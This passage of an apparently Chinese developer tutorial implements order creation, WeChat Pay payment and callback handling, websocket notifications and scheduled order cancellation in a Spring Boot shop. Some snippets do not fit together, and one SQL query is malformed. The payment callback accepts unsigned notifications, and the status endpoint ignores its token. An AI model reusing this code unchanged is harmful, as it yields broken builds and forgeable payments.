<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">addOrder</span><span class="hljs-params">(String cids, Orders order)</span> <span class="hljs-keyword">throws</span> SQLException &#123;
    <span class="hljs-comment">//处理cids</span>
    String[] strings = cids.split(<span class="hljs-string">&quot;,&quot;</span>);
    List&lt;Integer&gt; cidsInt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (String string : strings) &#123;
        cidsInt.add(Integer.parseInt(string));
    &#125;
    <span class="hljs-comment">// 查询与当前订单相关联的购物车记录</span>
    List&lt;ShoppingCartVO&gt; shopcartList = shoppingCartMapper.selectShopcartByCids(cidsInt);

    <span class="hljs-comment">// 判断商品库存是否充足</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-type">String</span> <span class="hljs-variable">untitle</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <span class="hljs-comment">// 保存所有商品的名称 最后保存到订单快照中</span>
    <span class="hljs-keyword">for</span> (ShoppingCartVO cartVO : shopcartList) &#123;
        <span class="hljs-keyword">if</span>(Integer.parseInt(cartVO.getCartNum()) &gt; cartVO.getSkuStock())&#123;
            flag = <span class="hljs-literal">false</span>;
        &#125;
        untitle = untitle + cartVO.getProductName() + <span class="hljs-string">&quot;,&quot;</span>;
    &#125;


    <span class="hljs-keyword">if</span>(flag)&#123;
        <span class="hljs-comment">// 库存充足 则保存订单</span>
        <span class="hljs-comment">// userId</span>
        <span class="hljs-comment">// untitle</span>
        <span class="hljs-comment">// 支付时间</span>
        <span class="hljs-comment">// 收货人的信息</span>
        <span class="hljs-comment">// 总价格</span>
        <span class="hljs-comment">// 支付方式（1）</span>
        <span class="hljs-comment">// 支付状态（待支付）</span>
        order.setUntitled(untitle);
        order.setCancelTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());
        order.setStatus(<span class="hljs-string">&quot;1&quot;</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString().replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);
        order.setOrderId(orderId);
        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> ordersMapper.insert(order);

        <span class="hljs-comment">// 生成商品快照</span>
        <span class="hljs-keyword">for</span> (ShoppingCartVO sc: shopcartList) &#123;
            <span class="hljs-type">int</span> <span class="hljs-variable">cnum</span> <span class="hljs-operator">=</span> Integer.parseInt(sc.getCartNum());
            <span class="hljs-type">String</span> <span class="hljs-variable">itemId</span> <span class="hljs-operator">=</span> System.currentTimeMillis()+<span class="hljs-string">&quot;&quot;</span>+ (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">89999</span>)+<span class="hljs-number">10000</span>);
            <span class="hljs-type">OrderItem</span> <span class="hljs-variable">orderItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(itemId, orderId, sc.getProductId(), sc.getProductName(), sc.getProductImg(), sc.getSkuId(), sc.getSkuName(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(sc.getSellPrice()), cnum, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(sc.getSellPrice() * cnum), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(), <span class="hljs-number">0</span>);
            orderItemMapper.insert(orderItem);
            <span class="hljs-comment">//增加商品销量</span>
        &#125;

        <span class="hljs-comment">// 扣减库存</span>
        <span class="hljs-comment">// 使用当前库存减去商品数量</span>
        <span class="hljs-keyword">for</span> (ShoppingCartVO cartVO : shopcartList) &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">skuId</span> <span class="hljs-operator">=</span> cartVO.getSkuId();
            <span class="hljs-type">int</span> <span class="hljs-variable">newStock</span> <span class="hljs-operator">=</span> cartVO.getSkuStock() - Integer.parseInt(cartVO.getCartNum());

            <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductSku.class);
            Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
            criteria.andEqualTo(<span class="hljs-string">&quot;skuId&quot;</span>, skuId);
            <span class="hljs-comment">//                ProductSku productSku = productSkuMapper.selectByPrimaryKey(skuId);</span>
            <span class="hljs-comment">//                productSku.setStock(newStock);</span>
            <span class="hljs-comment">//                int k = productSkuMapper.updateByExample(productSku, example);</span>
            <span class="hljs-type">ProductSku</span> <span class="hljs-variable">productSku</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductSku</span>();
            productSku.setStock(newStock);
            productSku.setSkuId(skuId);
            <span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> productSkuMapper.updateByPrimaryKeySelective(productSku);
        &#125;
        <span class="hljs-comment">//购买完成后 删除对应的购物车数据</span>
        <span class="hljs-keyword">for</span> (Integer cid : cidsInt) &#123;
            shoppingCartMapper.deleteByPrimaryKey(cid);
        &#125;

        <span class="hljs-keyword">return</span> ResultVO.success(<span class="hljs-string">&quot;生成订单成功！&quot;</span>, orderId);
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;商品库存不足，请重新选择！&quot;</span>);
    &#125;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java">    <span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span>
<span class="hljs-comment">//    @ApiImplicitParam(dataType = &quot;String&quot;,name = &quot;cids&quot;, value = &quot;购物车id&quot;,required = true)</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">list</span><span class="hljs-params">(String cids, <span class="hljs-meta">@RequestBody</span> Orders order)</span>&#123;
        System.out.println(<span class="hljs-string">&quot;##################&quot;</span>);
        System.out.println(cids);
        <span class="hljs-keyword">if</span>(cids.contains(<span class="hljs-string">&quot;#&quot;</span>))&#123;
            cids.replace(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);
        &#125;
        System.out.println(cids);
        <span class="hljs-keyword">try</span> &#123;
            Map&lt;String, String&gt; orderInfo = orderService.addOrder(cids, order);
            <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> orderInfo.get(<span class="hljs-string">&quot;orderId&quot;</span>);

            <span class="hljs-keyword">if</span>(orderId !=<span class="hljs-literal">null</span>)&#123;
                Map&lt;String , String&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
                data.put(<span class="hljs-string">&quot;body&quot;</span>,orderInfo.get(<span class="hljs-string">&quot;productNames&quot;</span>)); <span class="hljs-comment">//商品描述</span>
                data.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>,orderId); <span class="hljs-comment">//使⽤当前⽤户订单的编号作为当前⽀付交易的交易号</span>
                data.put(<span class="hljs-string">&quot;fee_type&quot;</span>,<span class="hljs-string">&quot;CNY&quot;</span>); <span class="hljs-comment">//⽀付币种</span>
                data.put(<span class="hljs-string">&quot;total_fee&quot;</span>, order.getActualAmount()*<span class="hljs-number">100</span> + <span class="hljs-string">&quot;&quot;</span> ); <span class="hljs-comment">//⽀付⾦额</span>
                data.put(<span class="hljs-string">&quot;trade_type&quot;</span>,<span class="hljs-string">&quot;NATIVE&quot;</span>); <span class="hljs-comment">//交易类型</span>
                data.put(<span class="hljs-string">&quot;notify_url&quot;</span>,<span class="hljs-string">&quot;/pay/success&quot;</span>); <span class="hljs-comment">//设置⽀付完成时的回调⽅法</span>
                <span class="hljs-type">WXPay</span> <span class="hljs-variable">wxPay</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WXPay</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyPayConfig</span>());
                Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); <span class="hljs-comment">//发送请求</span>
                System.out.println(resp);
                <span class="hljs-type">String</span> <span class="hljs-variable">code_url</span> <span class="hljs-operator">=</span> resp.get(<span class="hljs-string">&quot;code_url&quot;</span>);
                orderInfo.put(<span class="hljs-string">&quot;code_url&quot;</span>, code_url);
                <span class="hljs-keyword">return</span> ResultVO.success(orderInfo);
            &#125;<span class="hljs-keyword">else</span> &#123;
                <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;订单为空！&quot;</span>);
            &#125;
        &#125; <span class="hljs-keyword">catch</span> (SQLException throwables) &#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;添加订单失败！&quot;</span>);
        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
            e.printStackTrace();
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;添加订单失败！&quot;</span>);
        &#125;
    &#125;</code></pre></li>
</ul>
<h4 id="支付回调"><a href="#支付回调" class="headerlink" title="支付回调"></a>支付回调</h4><blockquote>
<p>当用户支付成功后，支付平台会向服务器的指定接口发送支付订单的支付状态数据</p>
</blockquote>
<ul>
<li><p>创建控制器并定义回调接口</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.controller;

<span class="hljs-keyword">import</span> com.github.wxpay.sdk.WXPayUtil;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.entity.Orders;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.service.OrderService;
<span class="hljs-keyword">import</span> com.qfedu.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.swagger.annotations.Api;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParam;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> javax.servlet.ServletInputStream;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/pay&quot;)</span>
<span class="hljs-meta">@Api(value = &quot;用户地址接口&quot;,tags = &quot;用户地址管理&quot;)</span>
<span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PayController</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderService orderService;

    <span class="hljs-meta">@GetMapping(&quot;/callable&quot;)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">success</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;
        <span class="hljs-type">ServletInputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> request.getInputStream();
        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];
        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">while</span>((len = is.read(bytes)) != -<span class="hljs-number">1</span>)&#123;
            builder.append(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span> ,len));
        &#125;
        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> builder.toString();
        <span class="hljs-comment">// 使用wxpay的工具类讲xml的响应结果 转换成map</span>
        Map&lt;String, String&gt; map = WXPayUtil.xmlToMap(s);
        <span class="hljs-keyword">if</span>(map != <span class="hljs-literal">null</span>  &amp;&amp; <span class="hljs-string">&quot;success&quot;</span>.equalsIgnoreCase(map.get(<span class="hljs-string">&quot;result_code&quot;</span>)))&#123;
            <span class="hljs-comment">// 支付成功</span>
            <span class="hljs-comment">// 修改订单状态为代发货/已支付</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> map.get(<span class="hljs-string">&quot;out_trade_no&quot;</span>);
            <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> orderService.updateOrderStatus(orderId, <span class="hljs-string">&quot;2&quot;</span>);
            <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;
                <span class="hljs-comment">// 响应微信平台</span>
                HashMap&lt;String, String&gt; resp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
                resp.put(<span class="hljs-string">&quot;return_code&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);
                resp.put(<span class="hljs-string">&quot;return_msg&quot;</span>, <span class="hljs-string">&quot;OK&quot;</span>);
                resp.put(<span class="hljs-string">&quot;appid&quot;</span>, map.get(<span class="hljs-string">&quot;appid&quot;</span>));
                resp.put(<span class="hljs-string">&quot;result_code&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>);
                <span class="hljs-type">String</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> WXPayUtil.mapToXml(resp);
                <span class="hljs-keyword">return</span> s1;
            &#125;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    &#125;

&#125;
</code></pre>




</li>
<li><p>设置回调的url</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715163058828.png" alt="image-20220715163058828"></p>
</li>
</ul>
<p>** 这里涉及到内网穿透的知识点，但是如果部署到云服务器上的可以忽略这一步</p>
<h4 id="订单状态查询"><a href="#订单状态查询" class="headerlink" title="订单状态查询"></a>订单状态查询</h4><p>该接口实现比较简单</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(String orderId)</span> &#123;
    <span class="hljs-type">Orders</span> <span class="hljs-variable">orders</span> <span class="hljs-operator">=</span> ordersMapper.selectByPrimaryKey(orderId);
    <span class="hljs-keyword">return</span> ResultVO.success(orders.getStatus());
&#125;
</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/status/&#123;oid&#125;&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getStatus</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;oid&quot;)</span> String oid, <span class="hljs-meta">@RequestHeader(&quot;token&quot;)</span> String token)</span>&#123;
    <span class="hljs-keyword">return</span> orderService.getOrderById(oid);
&#125;</code></pre>

<p>测试接口</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715173458440.png" alt="image-20220715173458440"></p>
</li>
</ul>
<h4 id="websocket消息推送"><a href="#websocket消息推送" class="headerlink" title="websocket消息推送"></a>websocket消息推送</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715174726117.png" alt="image-20220715174726117"></p>
<p>创建webSocket服务器</p>
<ul>
<li><p>添加依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-websocket<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>添加websocket服务节点配置（Java配置⽅式）</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.websocket;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.socket.server.standard.ServerEndpointExporter;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketConfig</span> &#123;

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> ServerEndpointExporter <span class="hljs-title function_">getServerEndpointExporter</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerEndpointExporter</span>();
    &#125;

&#125;
</code></pre>


</li>
<li><p>创建websocket服务器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.websocket;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> javax.websocket.OnClose;
<span class="hljs-keyword">import</span> javax.websocket.OnOpen;
<span class="hljs-keyword">import</span> javax.websocket.Session;
<span class="hljs-keyword">import</span> javax.websocket.server.PathParam;
<span class="hljs-keyword">import</span> javax.websocket.server.ServerEndpoint;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;

<span class="hljs-meta">@Component</span>
<span class="hljs-meta">@ServerEndpoint(&quot;/webSocket/&#123;oid&#125;&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketServer</span> &#123;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ConcurrentHashMap&lt;String,Session&gt; sessionMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">/**前端发送请求建立websocket连接，就会执行<span class="hljs-doctag">@OnOpen</span>方法**/</span>
    <span class="hljs-meta">@OnOpen</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-meta">@PathParam(&quot;oid&quot;)</span> String orderId, Session session)</span>&#123;
        System.out.println(<span class="hljs-string">&quot;------------建立连接：&quot;</span>+orderId);
        sessionMap.put(orderId,session);
    &#125;

    <span class="hljs-comment">/**前端关闭页面或者主动关闭websocket连接，都会执行close**/</span>
    <span class="hljs-meta">@OnClose</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">(<span class="hljs-meta">@PathParam(&quot;oid&quot;)</span> String orderId)</span>&#123;
        sessionMap.remove(orderId);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(String orderId,String msg)</span>&#123;
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionMap.get(orderId);
            session.getBasicRemote().sendText(msg);
        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
            e.printStackTrace();
        &#125;
    &#125;

&#125;
</code></pre>
</li>
<li><p>在PayController中添加使用websocket与前端通信的代码</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715223718929.png" alt="image-20220715223718929"></p>
</li>
</ul>
<h4 id="订单超时取消-定时任务"><a href="#订单超时取消-定时任务" class="headerlink" title="订单超时取消-定时任务"></a>订单超时取消-定时任务</h4><blockquote>
<p>当用户提交订单后，没有在规定时间内进行支付操作，该订单讲自动取消，还原商品库存信息</p>
<ul>
<li>定时任务(quartz）</li>
<li>延时队列（MQ）</li>
</ul>
</blockquote>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715224137251.png" alt="image-20220715224137251" style="zoom:67%;">

<blockquote>
<pre><code class="hljs reasonml">首先查询已失效的未支付订单
订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时，
如果订单的创建时间不在此范围内则属于失效的订单
需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能
出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若已经支付则修改支付状态为已支付（<span class="hljs-number">2</span>）
若仍然是未支付则取消订单，取消订单后需要修改订单状态 为支付失败(<span class="hljs-number">6</span>)，并向支付平台通知取消支付链接，恢复商品的库存，就是<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ProductSku</span>.</span></span>stock + <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">OrderItem</span>.</span></span>buy_conuts
这里需要考虑到数据库的并发问题，需要加锁和事务管理，隔离级别是 串行化，以保证数据的正确性和一致性</code></pre>
</blockquote>
<ul>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-meta">@Transactional(isolation = Isolation.SERIALIZABLE)</span> <span class="hljs-comment">//  隔离级别是 串行化</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">closeOrder</span><span class="hljs-params">(String orderId)</span> &#123;
    <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>)&#123;
        <span class="hljs-type">Orders</span> <span class="hljs-variable">orders</span> <span class="hljs-operator">=</span> ordersMapper.selectByPrimaryKey(orderId);
        orders.setStatus(<span class="hljs-string">&quot;6&quot;</span>);
        orders.setCloseType(<span class="hljs-number">1</span>); <span class="hljs-comment">// 失败原因未支付</span>
        <span class="hljs-comment">// 将订单状态改为支付失败</span>
        ordersMapper.updateByPrimaryKeySelective(orders);
        <span class="hljs-comment">// 根据订单id查询商品快照</span>
        <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(OrderItem.class);
        Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
        criteria.andEqualTo(<span class="hljs-string">&quot;orderId&quot;</span>, orderId);
        List&lt;OrderItem&gt; orderItems = orderItemMapper.selectByExample(example);

        <span class="hljs-keyword">for</span> (OrderItem orderItem : orderItems) &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">skuId</span> <span class="hljs-operator">=</span> orderItem.getSkuId();
            <span class="hljs-type">ProductSku</span> <span class="hljs-variable">productSku</span> <span class="hljs-operator">=</span> productSkuMapper.selectByPrimaryKey(skuId);
            productSku.setStock(productSku.getStock() + orderItem.getBuyCounts());
            productSkuMapper.updateByPrimaryKeySelective(productSku);
        &#125;
    &#125;
&#125;</code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Scheduled(cron = &quot;0/60 * * * * ?&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkAndCloseOrder</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-comment">// 首先查询已失效的未支付订单</span>
    <span class="hljs-comment">// 订单的有效支付时间是半小时，因此判断订单是否失效，就是从当前时间下，向前推半个小时，</span>
    <span class="hljs-comment">// 如果订单的创建时间不在此范围内则属于失效的订单</span>
    <span class="hljs-comment">// 需要注意的是，在数据库查询到是 未支付 状态的不一定就一定是未支付，因为支付平台支付成功对服务器响应过程中可能</span>
    <span class="hljs-comment">// 出现意想不到的问题，所以在修改订单状态之前一定要向支付平台确认此订单的状态，若仍然是 未支付 则取消订单</span>
    <span class="hljs-comment">// 取消订单后需要修改订单状态 为支付失败(6)，并向支付平台通知取消支付链接</span>
    <span class="hljs-comment">// 取消订单后，需要恢复商品的库存，就是ProductSku中的stock + OrderItem(订单快照)中的buy_conuts</span>
    <span class="hljs-comment">// 这里需要考虑到数据库的并发问题，需要加锁和事务管理</span>

    
    <span class="hljs-comment">// 1.查询超过三十分钟未支付订单</span>
    <span class="hljs-keyword">try</span>&#123;
        System.out.println(<span class="hljs-string">&quot;1——————————————————————----1&quot;</span>);
        <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(Orders.class);
        Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
        <span class="hljs-type">Date</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() - <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>);
        criteria.andLessThan(<span class="hljs-string">&quot;createTime&quot;</span>, time);
        List&lt;Orders&gt; orders = ordersMapper.selectByExample(example);
        <span class="hljs-comment">//2.访问微信平台接口，确认当前订单最终的支付状态</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; orders.size(); i++) &#123;
            <span class="hljs-type">Orders</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orders.get(i);
            HashMap&lt;String, String&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            params.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>, order.getOrderId());
            <span class="hljs-comment">// 使用微信支付提供发接口查询订单的支付状态</span>
            Map&lt;String, String&gt; resp = wxPay.orderQuery(params);
            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;SUCCESS&quot;</span>.equalsIgnoreCase(resp.get(<span class="hljs-string">&quot;trade_state&quot;</span>)))&#123;
                <span class="hljs-comment">//2.1 如果订单已经支付，则修改订单状态为&quot;代发货/已支付&quot;  status = 2</span>
                <span class="hljs-type">Orders</span> <span class="hljs-variable">updateOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Orders</span>();
                updateOrder.setOrderId(order.getOrderId());
                updateOrder.setStatus(<span class="hljs-string">&quot;2&quot;</span>);
                ordersMapper.updateByPrimaryKeySelective(updateOrder);
            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;NOTPAY&quot;</span>.equalsIgnoreCase(resp.get(<span class="hljs-string">&quot;trade_state&quot;</span>)))&#123;
                <span class="hljs-comment">//2.2 如果确实未支付 则取消订单：</span>
                <span class="hljs-comment">//  a.向微信支付平台发送请求，关闭当前订单的支付链接</span>
                Map&lt;String, String&gt; map = wxPay.closeOrder(params);
                System.out.println(map);

                <span class="hljs-comment">// b.关闭订单</span>
                orderService.closeOrder(order.getOrderId());
            &#125;
        &#125;
    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
        e.printStackTrace();
    &#125;
&#125;</code></pre></li>
</ul>
<h3 id="1-12-根据品牌筛选商品"><a href="#1-12-根据品牌筛选商品" class="headerlink" title="1.12 根据品牌筛选商品"></a>1.12 根据品牌筛选商品</h3><h4 id="获取某个商品的所有品牌"><a href="#获取某个商品的所有品牌" class="headerlink" title="获取某个商品的所有品牌"></a>获取某个商品的所有品牌</h4><ul>
<li><p>sql</p>
<p>首先根据分类的category_id获取该分类下的所有商品，再从这些商品中获取到品牌名称</p>
<pre><code class="hljs mysql">select product_id from product  where category_id= cid  

select  select DISTINCT brand  from product_params  where product_id in cids
// 合并
select  select DISTINCT brand  from product_params  where product_id in (
	select product_id from product  where category_id= cid  
)</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 根据类别id查询此类别下的商品的品牌列表</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> cid</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">selectBrandByCategoryId</span><span class="hljs-params">(<span class="hljs-type">int</span> cid)</span>;</code></pre>

<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectBrandByCategoryId&quot;</span> <span class="hljs-attr">resultSets</span>=<span class="hljs-string">&quot;java.util.List&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;String&quot;</span>&gt;</span>
    select DISTINCT brand
    from product_params
    where product_id in (
    select product_id
    from product
    where category_id=#&#123;cid&#125;
    )
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listBrands</span><span class="hljs-params">(<span class="hljs-type">int</span> categoryId)</span> &#123;
    List&lt;String&gt; brands = productMapper.selectBrandByCategoryId(categoryId);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK,<span class="hljs-string">&quot;success&quot;</span>,brands);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/listbrands/&#123;cid&#125;&quot;)</span>
